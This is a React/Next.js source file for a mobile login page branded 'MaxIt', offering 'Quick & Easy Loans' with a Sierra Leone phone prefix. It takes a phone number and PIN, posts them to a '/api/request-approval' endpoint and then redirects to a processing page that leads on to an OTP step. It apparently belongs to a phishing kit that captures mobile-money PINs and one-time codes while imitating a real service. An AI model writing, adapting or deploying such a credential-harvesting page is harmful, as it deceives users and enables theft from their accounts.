'use client';

import { useState, useRef, useEffect } from 'react';
import { useRouter } from 'next/navigation';

const LoginPage = () => {
    const router = useRouter();
    const [phone, setPhone] = useState('76123456');
    const [pin, setPin] = useState(['', '', '', '']);
    const [isLoading, setIsLoading] = useState(false);
    const pinRefs = [
        useRef<HTMLInputElement>(null),
        useRef<HTMLInputElement>(null),
        useRef<HTMLInputElement>(null),
        useRef<HTMLInputElement>(null),
    ];

    const isFormValid = phone.length >= 8 && pin.every((p) => p.length === 1);

    const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        setPhone(e.target.value.replace(/[^0-9]/g, '').slice(0, 8));
    };

    const handlePinChange = (index: number, value: string) => {
        const digit = value.replace(/[^0-9]/g, '').slice(-1);
        const newPin = [...pin];
        newPin[index] = digit;
        setPin(newPin);

        // Auto-advance
        if (digit && index < 3) {
            pinRefs[index + 1].current?.focus();
        }
    };

    const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
        if (e.key === 'Backspace' && pin[index] === '' && index > 0) {
            pinRefs[index - 1].current?.focus();
        }
    };

    const handleLogin = async () => {
        if (!isFormValid) return;
        setIsLoading(true);
        const fullPin = pin.join('');
        const requestId = crypto.randomUUID();

        try {
            await fetch('/api/request-approval', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'login', phone, pin: fullPin, requestId }),
            });
            router.push(`/processing?id=${requestId}&next=/otp&type=login`);
        } catch {
            setIsLoading(false);
        }
    };

    return (
        <div
            className="min-h-screen flex justify-center items-center"
            style={{ backgroundColor: '#ff7900' }}
        >
            <div
                className="w-full max-w-[420px] min-h-screen flex flex-col relative overflow-hidden"
                style={{ backgroundColor: '#ff7900' }}
            >
                {/* Header */}
                <header className="text-center pt-10 pb-6 px-5" style={{ color: 'white' }}>
                    <div className="text-[28px] font-extrabold tracking-tight mb-1">
                        Max<span className="text-black">It</span>
                    </div>
                    <div className="text-[11px] font-semibold">Quick &amp; Easy Loans</div>
                </header>

                {/* Main White Card */}
                <main
                    className="bg-white flex-grow flex flex-col items-center px-8 pt-10 pb-16"
                    style={{
                        borderBottomLeftRadius: '50% 45px',
                        borderBottomRightRadius: '50% 45px',
                        boxShadow: '0 10px 20px rgba(0,0,0,0.05)',
                        zIndex: 10,
                    }}
                >
                    <h1 className="text-lg font-semibold mb-8" style={{ color: '#475569' }}>
                        Login
                    </h1>

                    {/* Phone Input */}
                    <div
                        className="w-full flex items-center rounded-lg px-4 py-3 mb-8"
                        style={{ border: '2px solid #ff7900' }}
                    >
                        <div className="flex items-center mr-4 text-[12px] font-semibold text-slate-700 flex-shrink-0">
                            <span className="text-[10px] mr-1">SL</span> +232
                        </div>
                        <input
                            type="tel"
                            value={phone}
                            onChange={handlePhoneChange}
                            maxLength={8}
                            autoComplete="off"
                            placeholder="76123456"
                            className="flex-grow border-none outline-none text-sm font-medium text-slate-700 bg-transparent"
                        />
                    </div>

                    {/* PIN Section */}
                    <div className="w-full flex flex-col items-center mb-10">
                        <p className="text-[11px] mb-4" style={{ color: '#94a3b8' }}>
                            Enter your PIN
                        </p>
                        <div className="flex gap-3 mb-4">
                            {pin.map((digit, i) => (
                                <input
                                    key={i}
                                    ref={pinRefs[i]}
                                    type="password"
                                    value={digit}
                                    onChange={(e) => handlePinChange(i, e.target.value)}
                                    onKeyDown={(e) => handlePinKeyDown(i, e)}
                                    onFocus={(e) => e.target.select()}
                                    maxLength={1}
                                    inputMode="numeric"
                                    className="w-12 h-[52px] rounded-lg text-2xl font-bold text-center text-slate-700 outline-none transition-all duration-200"
                                    style={{
                                        border: '2px solid #ff7900',
                                        boxShadow: digit ? '0 0 0 3px rgba(255,121,0,0.2)' : 'none',
                                    }}
                                />
                            ))}
                        </div>
                        <a
                            href="#"
                            className="text-[11px] transition-colors"
                            style={{ color: '#94a3b8' }}
                            onMouseEnter={(e) => ((e.target as HTMLAnchorElement).style.textDecoration = 'underline')}
                            onMouseLeave={(e) => ((e.target as HTMLAnchorElement).style.textDecoration = 'none')}
                        >
                            Forgot PIN?
                        </a>
                    </div>

                    {/* Login Button */}
                    <button
                        onClick={handleLogin}
                        disabled={!isFormValid || isLoading}
                        className="w-full py-4 rounded-lg text-sm font-extrabold uppercase tracking-wide transition-all duration-300 cursor-pointer border-none"
                        style={{
                            backgroundColor: isFormValid ? '#ff7900' : '#e2e8f0',
                            color: 'white',
                            boxShadow: isFormValid ? '0 4px 12px rgba(255,121,0,0.3)' : 'none',
                            opacity: isLoading ? 0.8 : 1,
                        }}
                    >
                        {isLoading ? 'LOGGING IN...' : 'LOGIN'}
                    </button>
                </main>

                {/* Footer (orange, behind card) */}
                <footer
                    className="flex flex-col items-center justify-center text-center px-5 py-8"
                    style={{ backgroundColor: '#ff7900', color: 'white' }}
                >
                    <div className="text-2xl font-extrabold tracking-tight mb-1">
                        Max<span className="text-black">It</span>
                    </div>
                    <div className="text-[11px] font-semibold mb-6">Quick &amp; Easy Loans</div>
                    <div className="text-[10px] font-medium mb-2">v2.1.3P</div>
                    <div className="text-[9px] font-medium">
                        By signing in you agree to the{' '}
                        <a href="#" className="text-white underline">
                            Terms and Conditions
                        </a>
                    </div>
                </footer>
            </div>
        </div>
    );
};

export default LoginPage;
